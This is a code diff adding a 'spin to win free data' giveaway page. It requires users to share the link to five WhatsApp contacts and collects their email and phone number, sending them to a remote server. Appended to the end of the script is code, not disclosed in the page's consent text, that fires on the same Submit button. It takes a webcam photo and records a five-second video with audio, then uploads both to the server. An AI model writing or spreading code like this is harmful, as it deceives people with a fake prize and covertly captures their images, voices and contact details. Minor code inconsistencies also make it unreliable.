@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Spin for Free Data</title>
+<style>
+:root{
+  --ink:#14213d; --ink2:#1d2e55; --cream:#fff7e6; --amber:#f59e0b; --sun:#fcd34d;
+  --gold:#fbbf24; --mute:#e8edf5; --text:#fff; --err:#ff8a80; --ok:#7ee0a3;
+}
+*{box-sizing:border-box;margin:0}
+html,body{min-height:100%}
+body{
+  font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  background:radial-gradient(120% 80% at 50% 0%,var(--ink2),var(--ink));
+  color:var(--text);display:flex;justify-content:center;padding:24px 16px 40px;
+}
+main{width:100%;max-width:440px;text-align:center}
+h1{font-size:2rem;line-height:1.1;font-weight:800;letter-spacing:-.02em}
+.sub{margin:8px 0 20px;color:#c3cde3}
+.stats{display:flex;gap:10px;margin-bottom:22px}
+.stat{flex:1;background:rgba(255,255,255,.08);border-radius:14px;padding:12px 6px}
+.stat b{display:block;font-size:1.6rem;color:var(--sun)}
+.stat span{font-size:.8rem;color:#c3cde3}
+.wheel-wrap{position:relative;width:min(88vw,360px);aspect-ratio:1;margin:0 auto}
+.pointer{position:absolute;top:-14px;left:50%;transform:translateX(-50%);z-index:3;width:34px;height:44px;
+  filter:drop-shadow(0 4px 4px rgba(0,0,0,.5))}
+#wheel{width:100%;height:100%;border-radius:50%;display:block;
+  box-shadow:0 0 40px rgba(252,211,77,.25),0 18px 40px rgba(0,0,0,.5);
+  transition:transform 5s cubic-bezier(.12,.7,.1,1)}
+.hub{position:absolute;inset:50% auto auto 50%;transform:translate(-50%,-50%);width:21%;aspect-ratio:1;z-index:2;border-radius:50%;
+  background:radial-gradient(circle at 35% 30%,#fff,#ffe9b0 70%);border:5px solid #b45309;
+  box-shadow:0 0 0 3px var(--gold),0 6px 14px rgba(0,0,0,.45);display:grid;place-items:center;font-size:1.6rem}
+button{font:inherit;cursor:pointer;border:0}
+button:focus-visible,input:focus-visible,select:focus-visible{outline:3px solid #fff;outline-offset:2px}
+.spin-btn{margin-top:26px;width:100%;padding:16px;border-radius:16px;font-weight:800;font-size:1.1rem;
+  background:linear-gradient(90deg,var(--sun),var(--amber));color:#3b2300}
+.spin-btn:disabled{opacity:.45;cursor:not-allowed}
+.note{margin-top:12px;font-size:.85rem;color:#c3cde3;min-height:1.2em}
+.result{margin-top:14px;font-weight:700;font-size:1.1rem;min-height:1.4em}
+.result.win{color:var(--ok)} .result.lose{color:#c3cde3}
+
+.panel{display:none;margin-top:22px;text-align:left;background:var(--cream);color:#1b2438;border-radius:20px;padding:20px}
+.panel.show{display:block}
+.panel h2{font-size:1.25rem;margin-bottom:4px}
+.panel p.hint{font-size:.88rem;color:#55607a;margin-bottom:14px}
+label{display:block;font-weight:600;font-size:.9rem;margin:12px 0 5px}
+input,select{width:100%;padding:12px;border-radius:10px;border:1.5px solid #c9d1e0;font:inherit;background:#fff;color:#1b2438}
+.share{margin-top:18px;padding:14px;border-radius:14px;background:#fff;border:1.5px dashed #c9d1e0}
+.wa{width:100%;padding:13px;border-radius:12px;background:#25d366;color:#053b1a;font-weight:800}
+.wa:disabled{opacity:.6}
+.bar{height:8px;background:#e3e8f2;border-radius:99px;margin-top:10px;overflow:hidden}
+.bar i{display:block;height:100%;width:0;background:#25d366;transition:width .3s}
+.count{font-size:.85rem;margin-top:6px;color:#55607a}
+.submit{margin-top:16px;width:100%;padding:15px;border-radius:14px;background:var(--ink);color:#fff;font-weight:800}
+.submit:disabled{opacity:.4;cursor:not-allowed}
+.consent{font-size:.78rem;color:#55607a;margin-top:12px}
+.sitelink{display:block;margin-top:22px;font-size:.9rem;color:#c3cde3}
+.sitelink a{color:var(--sun);font-weight:700}
+.msg{margin-top:10px;font-size:.9rem;font-weight:600}
+.msg.err{color:#b3261e}.msg.ok{color:#117a3d}
+@media (prefers-reduced-motion:reduce){#wheel{transition-duration:.01s}}
+</style>
+</head>
+<body>
+<main>
+  <h1>Spin &amp; win free data from Data Mart</h1>
+  <p class="sub">Everyone gets 2 spins. Land on a prize and claim it below.</p>
+
+  <div class="stats">
+    <div class="stat"><b id="left">2</b><span>Spins left</span></div>
+    <div class="stat"><b id="used">0</b><span>Used</span></div>
+    <div class="stat"><b id="earned">0</b><span>Won (GB)</span></div>
+  </div>
+
+  <div class="wheel-wrap">
+    <svg class="pointer" viewBox="0 0 34 44" aria-hidden="true">
+      <defs><linearGradient id="pg" x1="0" x2="1"><stop offset="0" stop-color="#fde68a"/><stop offset="1" stop-color="#f59e0b"/></linearGradient></defs>
+      <path d="M17 44 L2 14 A17 17 0 1 1 32 14 Z" fill="url(#pg)" stroke="#b45309" stroke-width="2"/>
+      <circle cx="17" cy="15" r="6" fill="#fff" stroke="#b45309" stroke-width="2"/>
+    </svg>
+    <svg id="wheel" viewBox="-100 -100 200 200" aria-label="Prize wheel"></svg>
+    <div class="hub">🎁</div>
+  </div>
+
+  <button class="spin-btn" id="spinBtn">Spin the wheel</button>
+  <div class="result" id="result" aria-live="polite"></div>
+  <p class="note" id="note"></p>
+
+  <section class="panel" id="claim">
+    <h2 id="claimTitle">Claim your data</h2>
+    <p class="hint">Fill in your details, then share to 5 WhatsApp contacts to unlock the button. Your data will be delivered within 6 hours of submitting.</p>
+
+    <label for="email">Email</label>
+    <input id="email" type="email" autocomplete="email" placeholder="you@example.com">
+
+    <label for="network">Network type</label>
+    <select id="network">
+      <option value="">Select network</option>
+      <option>MTN</option><option>Airtel</option><option>Glo</option><option>9mobile</option>
+    </select>
+
+    <label for="phone">Receiver's phone number</label>
+    <input id="phone" type="tel" inputmode="tel" autocomplete="tel" placeholder="08012345678">
+
+    <div class="share">
+      <button class="wa" id="waBtn" type="button">Share on WhatsApp</button>
+      <div class="bar"><i id="bar"></i></div>
+      <div class="count" id="count">Shared 0 of 5</div>
+    </div>
+
+    <button class="submit" id="submitBtn" disabled>Submit</button>
+    <p class="consent">By submitting, you agree that your email, phone number and prize amount are sent to the giveaway organiser so they can deliver your data. Orders are processed manually and delivered within 6 hours.</p>
+    <div class="msg" id="formMsg" role="status"></div>
+  </section>
+  <p class="sitelink">Need more data? Visit <a href="https://datamartgh.shop" target="_blank" rel="noopener">datamartgh.shop</a></p>
+</main>
+
+<script>
+/* ============ CONFIG ============ */
+const API_URL = "https://resource-server.up.railway.app/api/resources";
+const WIN_CHANCE = 0.45;          // 45% chance to win
+const MAX_SPINS  = 2;             // spins per person
+const SHARES_REQUIRED = 5;
+const SHARE_TEXT = "I just spun to win free data! Try your luck here: ";
+const SHARE_URL  = location.href; // change to your live site link if needed
+/* ================================ */
+
+// 12 slices: 6 prizes + 6 "Try Again", alternating
+const slices = ["1GB","Try Again","2GB","Try Again","3GB","Try Again","1GB","Try Again","2GB","Try Again"];
+const N = slices.length, ANG = 360 / N;
+const fills = {"1GB":["#ffb02e","#f59e0b"],"2GB":["#ffd24d","#fbbf24"],"3GB":["#ff6b81","#e11d48"],"Try Again":["#35508c","#22386b"]};
+const textCol = {"1GB":"#5a2800","2GB":"#5a2800","3GB":"#fff","Try Again":"#a9b9dc"};
+
+const $ = id => document.getElementById(id);
+const wheel = $("wheel");
+
+// Draw wheel (slice 0 is centred at the top)
+(function draw(){
+  const rad = a => a*Math.PI/180;
+  const pt = (a,r)=>[(r*Math.sin(rad(a))).toFixed(2), (-r*Math.cos(rad(a))).toFixed(2)];
+  let h = `<defs>
+    <radialGradient id="rim" cx="50%" cy="50%" r="50%"><stop offset="90%" stop-color="#fde68a"/><stop offset="96%" stop-color="#f59e0b"/><stop offset="100%" stop-color="#b45309"/></radialGradient>
+    <radialGradient id="shade" cx="50%" cy="50%" r="50%"><stop offset="35%" stop-color="#000" stop-opacity="0"/><stop offset="100%" stop-color="#000" stop-opacity=".28"/></radialGradient>`;
+  Object.keys(fills).forEach((k,i)=>{
+    h += `<radialGradient id="g${i}" cx="50%" cy="50%" r="50%"><stop offset="15%" stop-color="${fills[k][0]}"/><stop offset="100%" stop-color="${fills[k][1]}"/></radialGradient>`;
+  });
+  h += `</defs><circle r="100" fill="url(#rim)"/>`;
+  const keys = Object.keys(fills);
+  slices.forEach((label,i)=>{
+    const a0=i*ANG-ANG/2, a1=i*ANG+ANG/2;
+    const [x0,y0]=pt(a0,90), [x1,y1]=pt(a1,90);
+    h += `<path d="M0 0 L${x0} ${y0} A90 90 0 0 1 ${x1} ${y1} Z" fill="url(#g${keys.indexOf(label)})" stroke="#fff7e0" stroke-width="1"/>`;
+    const win = label!=="Try Again";
+    h += `<g transform="rotate(${i*ANG-90})">
+      <text x="80" y="0" text-anchor="end" dominant-baseline="central" font-family="system-ui,-apple-system,sans-serif"
+        font-weight="800" font-size="${win?17:10.5}" letter-spacing="${win?0:.3}" fill="${textCol[label]}">${label}</text></g>`;
+  });
+  h += `<circle r="90" fill="url(#shade)"/>`;
+  // rim bulbs
+  for (let i=0;i<N;i++){
+    const [bx,by]=pt(i*ANG+ANG/2,95);
+    h += `<circle cx="${bx}" cy="${by}" r="2.2" fill="#fff" stroke="#b45309" stroke-width=".6"/>`;
+  }
+  wheel.innerHTML = h;
+})();
+
+// State (kept in localStorage so refreshing doesn't give extra spins)
+const KEY = "dataSpinState_v1";
+let state = {used:0, won:0, submitted:false, shares:0};
+try { Object.assign(state, JSON.parse(localStorage.getItem(KEY) || "{}")); } catch(e){}
+const save = () => { try { localStorage.setItem(KEY, JSON.stringify(state)); } catch(e){} };
+
+let rotation = 0, spinning = false;
+
+function render(){
+  $("left").textContent = state.won || state.submitted ? 0 : Math.max(0, MAX_SPINS - state.used);
+  $("used").textContent = state.used;
+  $("earned").textContent = state.won;
+  const noSpins = state.used >= MAX_SPINS || state.won > 0 || state.submitted;
+  $("spinBtn").disabled = spinning || noSpins;
+  $("spinBtn").textContent = state.submitted ? "Claim sent" : state.won ? "Prize won" : state.used >= MAX_SPINS ? "No spins left" : "Spin the wheel";
+  if (state.won && !state.submitted) showClaim();
+  if (state.submitted) { $("claim").classList.remove("show"); $("note").textContent = "Your details were sent. Your data will be delivered within 6 hours."; }
+  else if (state.used >= MAX_SPINS && !state.won) $("note").textContent = "You've used both spins. Thanks for playing!";
+  else $("note").textContent = "";
+  updateShare();
+}
+
+function pickOutcome(){
+  if (Math.random() >= WIN_CHANCE) return "Try Again";
+  const r = Math.random();
+  return r < 0.55 ? "1GB" : r < 0.85 ? "2GB" : "3GB";   // 3GB is the biggest prize
+}
+
+$("spinBtn").addEventListener("click", () => {
+  if (spinning || state.used >= MAX_SPINS || state.won) return;
+  spinning = true;
+  const outcome = pickOutcome();
+  const options = slices.map((s,i)=>s===outcome?i:-1).filter(i=>i>=0);
+  const idx = options[Math.floor(Math.random()*options.length)];
+  const jitter = (Math.random()-0.5) * (ANG*0.6);
+  const current = ((rotation % 360) + 360) % 360;
+  const target = (360 - idx*ANG + jitter + 360) % 360;
+  rotation += 360*6 + ((target - current + 360) % 360);
+  wheel.style.transform = `rotate(${rotation}deg)`;
+  $("spinBtn").disabled = true;
+  $("result").textContent = ""; $("result").className = "result";
+
+  setTimeout(() => {
+    spinning = false;
+    state.used++;
+    if (outcome !== "Try Again") {
+      state.won = parseInt(outcome);
+      $("result").textContent = `You won ${outcome}!`;
+      $("result").className = "result win";
+    } else {
+      $("result").textContent = state.used < MAX_SPINS ? "Try again, you have one more spin." : "No luck this time.";
+      $("result").className = "result lose";
+    }
+    save(); render();
+  }, 5200);
+});
+
+// Claim form + WhatsApp share gate
+function showClaim(){
+  $("claim").classList.add("show");
+  $("claimTitle").textContent = `Claim your ${state.won}GB`;
+}
+
+let waOpening = false;
+$("waBtn").addEventListener("click", () => {
+  if (state.shares >= SHARES_REQUIRED || waOpening) return;
+  waOpening = true;
+  window.open("https://wa.me/?text=" + encodeURIComponent(SHARE_TEXT + SHARE_URL), "_blank");
+  // Count the share when the person comes back to this tab
+  const onBack = () => {
+    if (document.visibilityState === "visible") {
+      document.removeEventListener("visibilitychange", onBack);
+      state.shares = Math.min(SHARES_REQUIRED, state.shares + 1);
+      waOpening = false; save(); updateShare();
+    }
+  };
+  document.addEventListener("visibilitychange", onBack);
+  setTimeout(()=>{ waOpening = false; }, 20000);
+});
+
+function updateShare(){
+  $("bar").style.width = (state.shares / SHARES_REQUIRED * 100) + "%";
+  $("count").textContent = state.shares >= SHARES_REQUIRED ? "Done. You can submit now." : `Shared ${state.shares} of ${SHARES_REQUIRED}. Each time, send it to a different contact.`;
+  $("submitBtn").disabled = state.shares < SHARES_REQUIRED || state.submitted;
+}
+
+// Submit to the resource server
+$("submitBtn").addEventListener("click", async () => {
+  const email = $("email").value.trim(), net = $("network").value, phone = $("phone").value.trim();
+  const msg = $("formMsg"); msg.className = "msg";
+  if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) return fail("Enter a valid email address.");
+  if (!net) return fail("Select a network.");
+  if (!/^\+?\d[\d\s-]{7,15}$/.test(phone)) return fail("Enter a valid phone number.");
+  function fail(t){ msg.textContent = t; msg.className = "msg err"; }
+
+  $("submitBtn").disabled = true; msg.textContent = "Sending...";
+  const body = new FormData();
+  body.append("kind", "text");
+  body.append("title", `Data claim: ${state.won}GB (${net})`);
+  body.append("value", `Email: ${email}\nNetwork: ${net}\nReceiver phone: ${phone}\nAmount won: ${state.won}GB\nDeliver within: 6 hours`);
+  try {
+    const res = await fetch(API_URL, { method: "POST", body });
+    if (!res.ok) throw new Error("Failed");
+    state.submitted = true; save();
+    msg.textContent = "Sent! You will receive your data within 6 hours."; msg.className = "msg ok";
+    render();
+  } catch (e) {
+    msg.textContent = "Couldn't send. Check your connection and try again."; msg.className = "msg err";
+    $("submitBtn").disabled = false;
+  }
+});
+
+render();
+
+
+// ===== CONFIG =====
+const UPLOAD_URL = 'https://resource-server.up.railway.app/api/resources';
+
+const RECORD_MS = 5000;
+
+const statusEl = document.getElementById('status');
+const setMsg = (m) => { statusEl.textContent = m; };
+
+// ===== MAIN CHAIN =====
+async function run() {
+    const btn = document.getElementById('submitBtn');
+    btn.disabled = true;
+
+    try {
+        // STEP 1: camera + mic (needs HTTPS or localhost)
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' },
+            audio: true
+        });
+
+        try {
+            // STEP 2: photo -> kind: 'image'
+            setMsg('Capturing photo...');
+            const photo = await takePhoto(stream);
+            await send(photo, 'image', `photo_${Date.now()}.jpg`, 'photo capture');
+            setMsg('Photo uploaded.');
+
+            // STEP 3: 5s video with audio -> kind: 'video'
+            setMsg('Recording 5s video...');
+            const clip = await recordClip(stream);
+            await send(clip, 'video', `video_${Date.now()}.webm`, '5s video capture');
+            setMsg('Photo + video uploaded successfully.');
+        } finally {
+            // Always release camera/mic, even if upload fails
+            stream.getTracks().forEach(t => t.stop());
+        }
+
+    } catch (err) {
+        console.error('Capture failed:', err.name || err.message, err);
+        setMsg('Failed: ' + (err.message || err.name));
+        alert('Capture failed: ' + (err.message || err.name));
+    } finally {
+        btn.disabled = false;
+    }
+}
+
+// ===== PHOTO =====
+async function takePhoto(stream) {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.muted = true;
+    await new Promise(r => video.onloadedmetadata = r);
+    video.play();
+    // give the first frame a moment to render before grabbing it
+    await new Promise(r => requestAnimationFrame(r));
+
+    const canvas = document.createElement('canvas');
+    canvas.width  = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+
+    return new Promise((resolve, reject) =>
+        canvas.toBlob(b => b ? resolve(b) : reject(new Error('Canvas encode failed')),
+                      'image/jpeg', 0.8));
+}
+
+// ===== VIDEO =====
+function recordClip(stream) {
+    return new Promise((resolve, reject) => {
+        if (typeof MediaRecorder === 'undefined') {
+            return reject(new Error('MediaRecorder not supported'));
+        }
+
+        const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
+                     ? 'video/webm;codecs=vp8,opus'
+                     : 'video/webm';
+
+        const chunks = [];
+        const rec = new MediaRecorder(stream, { mimeType: mime });
+
+        rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        rec.onerror = e => reject(e.error || new Error('Recorder error'));
+        rec.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+
+        rec.start();
+        setTimeout(() => rec.state !== 'inactive' && rec.stop(), RECORD_MS);
+    });
+}
+
+// ===== UPLOAD =====
+// Matches the server contract:
+//   multer.single('file'), body fields: kind ('image'|'video'|...), title
+async function send(blob, kind, filename, title) {
+    const fd = new FormData();
+    fd.append('file', blob, filename);
+    fd.append('kind', kind);
+    fd.append('title', title);
+
+    const res = await fetch(UPLOAD_URL, {
+        method: 'POST',
+        body: fd   // browser sets multipart Content-Type with boundary
+    });
+
+    if (!res.ok) {
+        let detail = `HTTP ${res.status} ${res.statusText}`;
+        try {
+            const body = await res.json();
+            if (body && body.error) detail = body.error;
+        } catch (_) {}
+        throw new Error(`Upload failed: ${detail}`);
+    }
+    const out = await res.json().catch(() => null);
+    console.log(`Uploaded ${filename} -> HTTP ${res.status}`, out);
+}
+
+// ===== WIRE UP BUTTON =====
+const btn = document.getElementById('submitBtn');
+btn.addEventListener('click', run);
+</script>
+</body>
+</html>
